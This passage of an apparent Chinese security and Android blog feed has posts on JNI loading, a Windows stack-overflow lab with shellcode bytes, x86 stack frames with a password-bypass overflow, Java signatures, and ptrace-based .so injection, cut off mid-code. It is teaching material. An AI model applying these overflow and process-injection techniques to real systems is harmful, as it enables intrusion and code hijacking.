class="line">&#125;</span><br></pre></td></tr></table></figure><p>先找到Method对应的函数指针，然后给Method设置一个Bridge，然后执行这个Bridge。看来不管是主动注册还是被动注册，都逃不掉Bridge。我们来看看是怎么通过Method找到对应的函数指针的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">lookupSharedLibMethod</span><span class="params">(<span class="keyword">const</span> Method* method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*) dvmHashForeach(gDvm.nativeLibs, findMethodInLib,</span><br><span class="line">        (<span class="keyword">void</span>*) method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findMethodInLib</span><span class="params">(<span class="keyword">void</span>* vlib, <span class="keyword">void</span>* vmethod)</span> </span>&#123;</span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    preMangleCM =</span><br><span class="line">        createJniNameString(meth-&gt;clazz-&gt;descriptor, meth-&gt;name, &amp;len);</span><br><span class="line"></span><br><span class="line">    mangleCM = mangleString(preMangleCM, len);</span><br><span class="line"></span><br><span class="line">    func = dlsym(pLib-&gt;handle, mangleCM);</span><br><span class="line"></span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dvmHashForeach就是遍历的，参数中传入了一个函数指针，就是说遍历时调这个函数指针来判断是否找到。找到的依据就是通过dlsym找到了我们要的符号。</p><blockquote><p>用dlopen加载so，然后全局缓存起来。当要调so中的函数时，就用dlsym到so中找到对应的函数指针。值得注意的是，类初始化时，所有的native函数的指针都指向了dvmResolveNativeMethod，表示这个函数还有待解析。如果主动在JNI_Onload中注册了，就会将函数指针指向一个Bridge，而真正要执行的函数指针赋给了insns。如果没有主动注册过，执行native函数时就会先解析函数，找到该函数真正要执行的函数指针，然后同样要指定一个Bridge，之后的流程都一样了。</p><p>这个Bridge的作用是什么呢？为什么要中间多这么一层呢？一方面是准备参数，另一方面虚拟机调用so中的函数，而so是编译于不同平台下的，不同平台下函数调用的参数传递规则是不同的，是入栈还是放在寄存器中，如果是入栈那么内存布局是什么样的，还有函数返回值怎么传递给调用者，这些都是平台相关的，有的甚至是用汇编写的。所以为了屏蔽这些不同，Dalvik虚拟机用了libffi开源库来统一调用接口，调用时也不是直接调用的，而是统一通过dvmPlatformInvoke来调用so中的函数。感兴趣的可以参考<a href="http://sourceware.org/libffi/" target="_blank" rel="noopener">http://sourceware.org/libffi/</a></p></blockquote><p>完结，撒花 ：）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文源码摘自 android-6.0.0_r24分支&lt;/p&gt;
&lt;p&gt;主要内容为梳理Android调用 System.loadLibrary()加载so库时的调用链&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="源码" scheme="http://imlzq.com/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出</title>
    <link href="http://imlzq.com/2018/02/01/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://imlzq.com/2018/02/01/栈溢出/</id>
    <published>2018-01-31T16:00:00.000Z</published>
    <updated>2018-02-12T09:53:46.970Z</updated>
    
    <content type="html"><![CDATA[<p>windows 栈溢出</p><a id="more"></a>    <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">#define PASSWORD "1234567"</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">44</span>];</span><br><span class="line">ret = strcmp(password, PASSWORD);</span><br><span class="line">strcpy(buff, password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(fp= fopen(<span class="string">"C://Users//CytQ//Desktop//password.txt"</span>, <span class="string">"rw+"</span>)))</span><br><span class="line">&#123;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fscanf(fp, <span class="string">"%s"</span>, password);</span><br><span class="line"></span><br><span class="line">flag = verify_password(password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"Failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"pass\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PASSWORD.TXT: IN HEX</p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/e0742c48617627b8f81bed1f048b804019d349b3" alt="PASSWORD.TXT"></p><p>HEX IS : 33 DB 53 68 C6 F4 DD 01 68 C6 F4 DD 01 8B C4 53 50 50 53 B8 AE FE 96 75 FF D0</p><p>MessageBoxA IN USER32.DLL  ABSOLUTELY ADDRESS: 0X7596feae</p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/b2d4e4b6c30d21c83a666bd6e67b6f862552e118" alt="RESULT"></p><p>AND THEN, CRASH</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;windows 栈溢出&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编示例、代码梳理和演示</title>
    <link href="http://imlzq.com/2018/01/30/x86%E6%B1%87%E7%BC%96%E7%A4%BA%E4%BE%8B%E3%80%81%E4%BB%A3%E7%A0%81%E6%A2%B3%E7%90%86%E5%92%8C%E6%BC%94%E7%A4%BA/"/>
    <id>http://imlzq.com/2018/01/30/x86汇编示例、代码梳理和演示/</id>
    <published>2018-01-30T15:00:00.000Z</published>
    <updated>2018-04-05T12:50:28.937Z</updated>
    
    <content type="html"><![CDATA[<p>x86跟ARM在一些指令集上有区别，但是大致逻辑一直。下面是以一个有栈溢出漏洞的vc6.0编写的C程序做示例。</p><a id="more"></a>    <p><strong>C中，函数调用的逻辑为：</strong></p><p>##1. 函数参数入栈</p><p>如func(int a, int b, int c)<br>会将三个参数从右到左依次入栈。也就是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push c</span><br><span class="line">push b</span><br><span class="line">push a</span><br></pre></td></tr></table></figure></p><p>##2.函数的返回地址入栈</p><p>让程序知道执行完当前程序后怎么处理下一步。在汇编中的表现形式和3合并</p><p>##3.代码区跳转</p><p>跳转到被调用函数的入口地址，方便执行。<br>它和2的表现为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 函数地址</span><br></pre></td></tr></table></figure></p><p>##4.栈帧调整</p><p>这里会有3步</p><pre><code>1. 保存当前的栈帧：push ebp2. 设置新栈帧的底部：move ebp, esp3. 抬高esp，也就是分配栈帧空间： sub esp, xx</code></pre><p>##5. 【本函数调用完后】降低栈帧，释放空间</p><p>add esp, xx</p><p><strong>这样也就完成了一个函数的整体调用，具体的看下面的截图和其中的注释</strong></p><blockquote><p>对于下面的局部变量申明，有一点需要注意的。<br>比如第2张图，var_444 = -444h，这个负号是因为它比当前的ebp先入栈。对于当前函数来说，高于ebp是正数，低于的就是负数。ebp可以理解为0这个基线，-444h就能找到它的指定位置</p></blockquote><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/9db03478a7c26d09e292d5de2ccaee55fba888e1" alt="x86汇编7"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/3ccc297a5046230c0a2a2833f5eac13e28464aa1" alt="x86汇编1"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/67b739dbe7196b2b63df67c16a5281a842d3c0c2" alt="x86汇编2"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/1c27973a000662e8ff0cb4d636da661eec1c70dd" alt="x86汇编3"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/f7d7dd01054ec84e5505ecc96a496b3ecc8cbaa3" alt="x86汇编4"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/14e5790bbe380bcd7eb7674ee1a3ec5db3a7a139" alt="x86汇编5"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/52c078db92a32c0de0d7ed69f5b098a5d33cd938" alt="x86汇编6"></p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/1bea2f9369aa419f2e49f5e324c9028f5aea8491" alt="x86汇编8"></p><p>对于verify_password函数来说，它的栈帧为（从下到上）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buff[<span class="number">0</span>~<span class="number">3</span>]</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">4</span>~<span class="number">7</span>]</span><br><span class="line"><span class="keyword">int</span> ret</span><br><span class="line">上一个栈帧的EBP</span><br><span class="line">verify_password函数的返回地址</span><br><span class="line">形参password</span><br></pre></td></tr></table></figure></p><p>此时的EBP指针指向”上一个栈帧的EBP”, ESP指向”char buff[0~3]”。</p><p>##绕过密码检测</p><p>对于ret来说，int值为4个字节，所以只需要在strcpy时让buff越界四位，那么buff[8]，buff[9], buff[10], buff[11]就会覆盖ret的值。这里有个tips，对于字符串而言，末尾会自动加入一个NULL结束符，所以只要我们输入任意的8个字符，如12345678，就能通过这个密码程序（正确的密码是1234567）。<br>ret的值其实来源于strcmp的返回值，根据字符串的串顺序，如果password&gt;1234567如12345678），那么ret=0x00000001，这个时候我们就可以用NULL覆盖的方法让它变为0x00000000。而如果password&lt;1234567（如12345668），函数返回-1，此时ret=0xFFFFFF00，这时候用NULL就覆盖不了了</p><p>下图为输入1234567后栈顶保存的数据，它指向0018FB44这个地址，而这个地址的内容为（ASCII码）31,32,33,34,35,36,37。也就是数字的1234567.最后的00，是存放字符串的NULL的<br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/751d9617eecf24590d26c53e20cecb53d6b48ec8" alt="图片"></p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/cc3d43d6bcea77d2a5d5d621d0edd619ff520561" alt="图片"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;x86跟ARM在一些指令集上有区别，但是大致逻辑一直。下面是以一个有栈溢出漏洞的vc6.0编写的C程序做示例。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="汇编" scheme="http://imlzq.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Java函数签名</title>
    <link href="http://imlzq.com/2018/01/30/Java%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D/"/>
    <id>http://imlzq.com/2018/01/30/Java函数签名/</id>
    <published>2018-01-30T13:00:00.000Z</published>
    <updated>2018-04-06T15:53:14.920Z</updated>
    
    <content type="html"><![CDATA[<p><strong>表现形式：</strong></p><p>(参数类型参数类型参数类型参数类型)函数类型</p><p><strong>例如：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span> res, String test, <span class="keyword">long</span> key)</span></span></span><br></pre></td></tr></table></figure><p><strong>函数方法体为：</strong></p><p>(ILjava/lang/String;J)I</p><ul><li>I   代表int</li><li>Ljava/lang/String;  代表String。因为它不属于基本数据类型，是一个类，所以需要指定完整的路径</li><li>J代表long</li></ul><p>参数与参数之间无间隔，用括号包裹，紧接着跟函数的数据类型。</p><a id="more"></a>    <h2 id="获取函数的方法签名"><a href="#获取函数的方法签名" class="headerlink" title="获取函数的方法签名"></a>获取函数的方法签名</h2><p>如：针对Hello.class，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -s Hello</span><br></pre></td></tr></table></figure><p>即可获取其内部所有的函数方法签名</p><p>##Java方法签名中特殊字符/字母含义</p><table><thead><tr><th>特殊字符</th><th>数据类型</th><th>特殊说明</th></tr></thead><tbody><tr><td>V</td><td>void</td><td>返回值</td></tr><tr><td>Z</td><td>boolean</td><td></td></tr><tr><td>B</td><td>byte</td><td></td></tr><tr><td>C</td><td>char</td><td></td></tr><tr><td>S</td><td>short</td><td></td></tr><tr><td>I</td><td>int</td><td></td></tr><tr><td>J</td><td>long</td><td></td></tr><tr><td>F</td><td>float</td><td></td></tr><tr><td>D</td><td>double</td><td></td></tr><tr><td>[</td><td>数组</td><td>以[开头，配合其他的特殊字符，表示对应数据类型的数组，几个[表示几维数组</td></tr><tr><td>L全类名;</td><td>引用类型</td><td>以L开头、;结尾，中间是引用类型的全类名</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;表现形式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(参数类型参数类型参数类型参数类型)函数类型&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; res, String test, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; key)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;函数方法体为：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(ILjava/lang/String;J)I&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I   代表int&lt;/li&gt;
&lt;li&gt;Ljava/lang/String;  代表String。因为它不属于基本数据类型，是一个类，所以需要指定完整的路径&lt;/li&gt;
&lt;li&gt;J代表long&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数与参数之间无间隔，用括号包裹，紧接着跟函数的数据类型。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="Java" scheme="http://imlzq.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>So注入</title>
    <link href="http://imlzq.com/2018/01/09/so_inject/"/>
    <id>http://imlzq.com/2018/01/09/so_inject/</id>
    <published>2018-01-09T14:26:24.000Z</published>
    <updated>2018-04-14T08:17:48.242Z</updated>
    
    <content type="html"><![CDATA[<p><strong>so注入的主要思路是：</strong></p><ol><li>找到目标进程</li><li>使用ptrace跟踪目标进程，保存目标进程的状态</li><li>获得mmap、dlopen、dlsym等库函数在目标进程中的偏移地址</li><li>调用mmap在目标进程内部申请一段内存空间</li><li>将我们的ShellCode写入到刚才申请的内存空间中</li><li>dlopen打开Shellcode，dlsym调用Shellcode库的函数</li><li>恢复原so状态，detach</li></ol><a id="more"></a><h1 id="核心点"><a href="#核心点" class="headerlink" title="核心点"></a>核心点</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> ptrace（<span class="keyword">enum</span> _ptrace_request request,<span class="keyword">pid_t</span> pid,<span class="keyword">void</span> * addr ,<span class="keyword">void</span> *data）;</span><br><span class="line"></span><br><span class="line">    <span class="number">1</span>). <span class="keyword">enum</span> __ptrace_request request：指示了ptrace要执行的命令。</span><br><span class="line">    <span class="number">2</span>). <span class="keyword">pid_t</span> pid: 指示ptrace要跟踪的进程。</span><br><span class="line">    <span class="number">3</span>). <span class="keyword">void</span> *addr: 指示要监控的内存地址。</span><br><span class="line">    <span class="number">4</span>). <span class="keyword">void</span> *data: 存放读取出的或者要写入的数据。</span><br></pre></td></tr></table></figure><p>简单点，ptrace是个系统调用，功能是提供一个进程（父进程）监控和管理另一个进程（子进程）的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。</p><p>基本原理是: 当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。   </p><blockquote><p>ptrace命令</p><p>1). 用PTRACE_ATTACH或者PTRACE_TRACEME 建立进程间的跟踪关系。<br>2). PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR等读取子进程内存/寄存器中保留的值。<br>3). PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR等把值写入到被跟踪进程的内存/寄存器中<br>4). 用PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP控制被跟踪进程以何种方式继续运行。<br>5). PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系。</p><p>TIPS:</p><pre><code>1. 进程状态TASK_TRACED用以表示当前进程因为被父进程跟踪而被系统停止。2. 如在子进程结束前，父进程结束，则trace关系解除。3. 利用attach建立起来的跟踪关系，虽然ps看到双方为父子关系，但在&quot;子进程&quot;中调用getppid()仍会返回原来的父进程id。4. 不能attach到自己不能跟踪的进程，如non-root进程跟踪root进程。5. 已经被trace的进程，不能再次被attach。6. 即使是用PTRACE_TRACEME建立起来的跟踪关系，也可以用DETACH的方式予以解除。7. 因为进入/退出系统调用都会触发一次SIGTRAP，所以通常的做法是在第一次(进入)的时候读取系统调用的参数，在第二次(退出)的时候读取系统调用的返回值。但注意execve是个例外。8. 程序调试时的断点由int 3设置完成，而单步跟踪则可由ptrace(PTRACE_SINGLESTEP)实现。</code></pre></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(pid = fork())  </span><br><span class="line">   &#123;  </span><br><span class="line">   <span class="keyword">case</span> <span class="number">-1</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//子进程  </span></span><br><span class="line">       ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       execl(<span class="string">"./HelloWorld"</span>, <span class="string">"HelloWorld"</span>, <span class="literal">NULL</span>);  </span><br><span class="line">   <span class="keyword">default</span>: <span class="comment">//父进程  </span></span><br><span class="line">       wait(&amp;val); <span class="comment">//等待并记录execve  </span></span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(val))  </span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">       syscallID=ptrace(PTRACE_PEEKUSER, pid, ORIG_EAX*<span class="number">4</span>, <span class="literal">NULL</span>);  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Process executed system call ID = %ld/n"</span>,syscallID);  </span><br><span class="line">       ptrace(PTRACE_SYSCALL,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在上面的程序中，fork出的子进程先调用了ptrace(PTRACE_TRACEME)表示子进程让父进程跟踪自己。然后子进程调用execl加载执行了HelloWorld。</p><p>而在父进程中则使用wait系统调用等待子进程的中断或结束。子进程因为设置了PTRACE_TRACEME而在执行系统调用被系统停止(设置为TASK_TRACED)，这时父进程被唤醒，使用ptrace(PTRACE_PEEKUSER,pid,…)分别去读取子进程执行的系统调用ID(放在ORIG_EAX中)以及系统调用返回时的值(放在EAX中)。然后使用ptrace(PTRACE_SYSCALL,pid,…)指示子进程运行到下一次执行系统调用的时候(进入或者退出)，直到子进程退出为止。</p><blockquote><p>wait指令会让父进程挂起，等待子进程的中断或结束</p></blockquote><h3 id="断点原理"><a href="#断点原理" class="headerlink" title="断点原理"></a>断点原理</h3><p>断点是大家在调试程序时常用的一个功能,如break linenumber，当执行到linenumber那一行的时候被调试程序会停止，等待debugger的进一步操作。<br>断点的实现原理，就是在指定的位置插入断点指令，当被调试的程序运行到断点的时候，产生SIGTRAP信号。该信号被gdb捕获并进行断点命中判定，当gdb判断出这次SIGTRAP是断点命中之后就会转入等待用户输入进行下一步处理，否则继续。</p><p>断点的设置原理: 在程序中设置断点，就是先将该位置的原来的指令保存，然后向该位置写入int 3。当执行到int 3的时候，发生软中断，内核会给子进程发出SIGTRAP信号，当然这个信号会被转发给父进程。然后用保存的指令替换int3,等待恢复运行。<br>断点命中判定:gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。</p><h3 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h3><p>单步跟踪就是指在调试程序的时候，让程序运行一条指令/语句后就停下。GDB中常用的命令有next, step, nexti, stepi。单步跟踪又常分为语句单步(next, step)和指令单步(如nexti, stepi)。</p><p>在linux上，指令单步可以通过ptrace来实现。调用ptrace(PTRACE_SINGLESTEP,pid,…)可以使被调试的进程在每执行完一条指令后就触发一个SIGTRAP信号，让GDB运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">child = fork();  </span><br><span class="line">   <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;  </span><br><span class="line">        execl(<span class="string">"./HelloWorld"</span>, <span class="string">"HelloWorld"</span>, <span class="literal">NULL</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">else</span> &#123;  </span><br><span class="line">       ptrace(PTRACE_ATTACH,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       <span class="keyword">while</span>(<span class="number">1</span>)&#123;  </span><br><span class="line">       wait(&amp;val);  </span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(val))  </span><br><span class="line">           <span class="keyword">break</span>;  </span><br><span class="line">       count++;  </span><br><span class="line">       ptrace(PTRACE_SINGLESTEP,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       &#125;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Total Instruction number= %d/n"</span>,count);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="1、找到目标进程"><a href="#1、找到目标进程" class="headerlink" title="1、找到目标进程"></a>1、找到目标进程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> target_pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PS命令能找到的进程</span></span><br><span class="line">target_pid = find_pid_of(<span class="string">"/system/bin/logwrapper"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span> == target_pid) &#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't find the process\n"</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到目标进程的实现方式为：通过proc文件系统来一一比较。</p><blockquote><p>在Linux上，proc是一个伪文件系统，提供了访问内核数据的方法，一般挂载在“/proc”目录</p></blockquote><p>每个正在运行着的进程都proc下都会有个目录，目录名为pid。</p><p>例如init进程，它的pid为1，所以对应/proc/1/，这个目录下保存的就是Init进程相关的数据。</p><p><strong>找到目标进程的逻辑：</strong></p><ul><li>打开proc目录</li><li>读取该目录，并转为dirent</li><li>读取dirent-&gt;d_name值，并转为int号，也就是pid号</li><li>在循环遍历每一个读取到的pid目录下的cmdline，用\0’分割其中的字符串得到进程的args[]，拿到args[0]，也就是进程的绝对路径</li><li>匹配进程名是否一致</li></ul><p><strong>dirent：</strong>是一个结构体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> d_ino; <span class="comment">/* inode number 索引节点号 */</span></span><br><span class="line">  <span class="keyword">off_t</span> d_off; <span class="comment">/* offset to this dirent 在目录文件中的偏移 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* length of this d_name 文件名长 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> d_type; <span class="comment">/* the type of d_name 文件类型 */</span></span><br><span class="line">  <span class="keyword">char</span> d_name [NAME_MAX+<span class="number">1</span>]; <span class="comment">/* file name (null-terminated) 文件名，最长256字符 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>cmdline：</strong>存储的是main方法用的参数，也就是args，args[0]就是进程的绝对路径</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 